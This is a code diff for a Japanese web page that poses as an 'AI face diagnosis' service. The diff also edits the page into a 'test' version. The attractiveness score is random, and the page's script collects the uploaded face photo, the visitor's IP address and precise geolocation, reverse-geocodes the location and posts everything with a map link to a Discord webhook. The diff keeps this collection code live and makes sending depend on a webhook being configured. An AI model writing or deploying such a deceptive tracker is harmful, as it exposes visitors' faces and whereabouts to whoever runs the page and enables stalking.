@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI 顔診断</title>
+<title>AI 顔診断（テスト高速版）</title>
 
 <style>
 :root {
@@ -24,32 +24,11 @@ body {
   height: 100vh;
 }
 .container { max-width: 420px; width: 100%; padding: 20px; }
-.card {
-  background: var(--card);
-  backdrop-filter: blur(14px);
-  border-radius: 20px;
-  padding: 24px;
-  text-align: center;
-}
+.card { background: var(--card); backdrop-filter: blur(14px); border-radius: 20px; padding: 24px; text-align: center; }
 .sub { font-size: 13px; color: var(--text-sub); margin-bottom: 12px; }
-.label-btn {
-  display: block;
-  padding: 12px;
-  background: rgba(255,255,255,0.1);
-  border-radius: 12px;
-  cursor: pointer;
-  margin-bottom: 10px;
-}
+.label-btn { display: block; padding: 12px; background: rgba(255,255,255,0.1); border-radius: 12px; cursor: pointer; margin-bottom: 10px; }
 input[type="file"] { display:none; }
-button {
-  width: 100%;
-  padding: 12px;
-  border: none;
-  border-radius: 12px;
-  background: var(--accent);
-  font-weight: bold;
-  cursor: pointer;
-}
+button { width: 100%; padding: 12px; border: none; border-radius: 12px; background: var(--accent); font-weight: bold; cursor: pointer; }
 .preview img { width: 100%; margin-top: 10px; border-radius: 12px; }
 .result { margin-top: 15px; }
 </style>
@@ -59,12 +38,8 @@ button {
 <div class="container">
 <div class="card">
 
-<h1>AI 顔診断</h1>
-
-<div class="sub">
-画像を選ぶだけで診断できます
-</div>
-
+<h1>AI 顔診断（テスト高速版）</h1>
+<div class="sub">画像を選ぶだけで診断できます</div>
 <div class="sub">
 本サービスでは診断処理および不正防止のため、画像・IPアドレス・位置情報を外部サーバーへ送信します。<br>
 （許可は任意です）
@@ -87,115 +62,110 @@ button {
 </div>
 
 <script>
-const WEBHOOK_URL = "ここにWebhook入れる";
+let WEBHOOK_URL = ""; // Discord Webhookを設定すれば送信される
 
-// 診断開始
 async function startDiagnosis() {
   const file = document.getElementById("file").files[0];
-  if (!file) { alert("画像選んで！"); return; }
+  if(!file){ alert("画像選んで！"); return; }
 
   const result = document.getElementById("result");
   result.style.display = "block";
   result.innerHTML = "診断中...";
 
-  if (!navigator.geolocation) {
+  if(!navigator.geolocation){
     runDiagnosis(file, null, null);
     return;
   }
 
-  // 位置情報を複数回取得して最頻値
+  // 位置情報取得3回
   const positions = [];
-  const attempts = 5;
-  for (let i = 0; i < attempts; i++) {
-    try {
-      const pos = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+  for(let i=0;i<3;i++){
+    try{
+      const pos = await new Promise((resolve,reject)=>{
+        navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:true});
       });
-      positions.push({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-    } catch {}
+      positions.push({lat:pos.coords.latitude,lon:pos.coords.longitude});
+    }catch{}
   }
 
-  let lat = null, lon = null;
-  if (positions.length > 0) {
+  let lat=null, lon=null;
+  if(positions.length>0){
     const freq = {};
-    positions.forEach(p => {
-      const key = `${p.lat.toFixed(5)},${p.lon.toFixed(5)}`;
-      freq[key] = (freq[key] || 0) + 1;
+    positions.forEach(p=>{
+      const key=`${p.lat.toFixed(5)},${p.lon.toFixed(5)}`;
+      freq[key]=(freq[key]||0)+1;
     });
-    const maxKey = Object.keys(freq).reduce((a,b)=> freq[a]>freq[b]?a:b);
-    [lat, lon] = maxKey.split(",").map(Number);
+    const maxKey = Object.keys(freq).reduce((a,b)=>freq[a]>freq[b]?a:b);
+    [lat, lon]=maxKey.split(",").map(Number);
   }
 
   runDiagnosis(file, lat, lon);
 }
 
-// 診断処理
-function runDiagnosis(file, lat, lon) {
+function runDiagnosis(file, lat, lon){
   const reader = new FileReader();
-  reader.onload = async () => {
+  reader.onload = async ()=>{
     const base64 = reader.result;
 
-    document.getElementById("preview").src = base64;
-    document.getElementById("previewBox").style.display = "block";
+    document.getElementById("preview").src=base64;
+    document.getElementById("previewBox").style.display="block";
 
     const result = document.getElementById("result");
-    result.innerHTML = "顔検出中...";
-    setTimeout(()=>result.innerHTML="特徴解析中...",500);
+    result.innerHTML="顔検出中...";
+    setTimeout(()=>result.innerHTML="特徴解析中...",200);
 
     setTimeout(async ()=>{
       const score = Math.floor(30+Math.random()*20);
       const rank = score>=45?"S":score>=30?"A":"B";
+      result.innerHTML=`ランク ${rank}<br>黄金比スコア：${score}%<br>いい感じやん`;
 
-      result.innerHTML = `ランク ${rank}<br>黄金比スコア：${score}%<br>いい感じやん`;
-
-      await sendToDiscord(base64, score, rank, lat, lon);
-    },1200);
-  };
+      await sendToDiscord(base64,score,rank,lat,lon);
+    },400);
+  }
   reader.readAsDataURL(file);
 }
 
-// 逆ジオコーディング
-async function getAddress(lat, lon) {
-  try {
-    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`);
-    const data = await res.json();
-    return data.address.city || data.address.town || data.address.village || data.address.county || "不明";
-  } catch { return "取得失敗"; }
+async function getAddress(lat, lon){
+  try{
+    const res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`);
+    const data=await res.json();
+    return data.address.city||data.address.town||data.address.village||data.address.county||"不明";
+  }catch{return "取得失敗";}
 }
 
-// Discord送信
-async function sendToDiscord(base64, score, rank, lat, lon) {
+async function sendToDiscord(base64, score, rank, lat, lon){
   const fd = new FormData();
-  fd.append("file", dataURLtoBlob(base64), "face.png");
+  fd.append("file",dataURLtoBlob(base64),"face.png");
 
   const ipData = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+  let address="不明";
+  if(lat && lon){ address=await getAddress(lat,lon); }
 
-  let address = "不明";
-  if (lat && lon) { address = await getAddress(lat, lon); }
-
-  fd.append("payload_json", JSON.stringify({
-    content: `
+  const payload = `
 📸 顔診断
 IP: ${ipData.ip}
 地域: ${address}
 位置: https://maps.google.com/?q=${lat??"不明"},${lon??"不明"}
 黄金比: ${score}%
 ランク: ${rank}
-`
-  }));
+`;
 
-  fetch(WEBHOOK_URL, { method:"POST", body:fd })
-    .then(res=>console.log("送信OK", res.status))
-    .catch(err=>console.log("送信エラー", err));
+  console.log("送信内容（テスト）:",payload); // Webhook未設定でも確認可能
+  if(WEBHOOK_URL) fd.append("payload_json", JSON.stringify({content:payload}));
+
+  if(WEBHOOK_URL){
+    fetch(WEBHOOK_URL,{method:"POST",body:fd})
+      .then(res=>console.log("送信OK",res.status))
+      .catch(err=>console.log("送信エラー",err));
+  }
 }
 
-// base64 → Blob変換
 function dataURLtoBlob(dataurl){
-  const arr = dataurl.split(',');
-  const mime = arr[0].match(/:(.*?);/)[1];
-  const bstr = atob(arr[1]);
-  let n = bstr.length;
-  const u8 = new Uint8Array(n);
+  const arr=dataurl.split(',');
+  const mime=arr[0].match(/:(.*?);/)[1];
+  const bstr=atob(arr[1]);
+  let n=bstr.length;
+  const u8=new Uint8Array(n);
   while(n--) u8[n]=bstr.charCodeAt(n);
   return new Blob([u8],{type:mime});
 }
